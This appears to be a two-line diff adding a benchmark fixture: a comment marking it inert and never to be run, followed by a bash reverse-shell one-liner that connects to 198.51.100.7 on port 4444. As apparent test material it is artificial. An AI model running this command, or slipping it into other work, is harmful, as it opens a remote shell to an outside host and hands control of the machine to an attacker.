@@ -1,0 +1,2 @@
+# INERT BENCHMARK FIXTURE - never run.
+bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
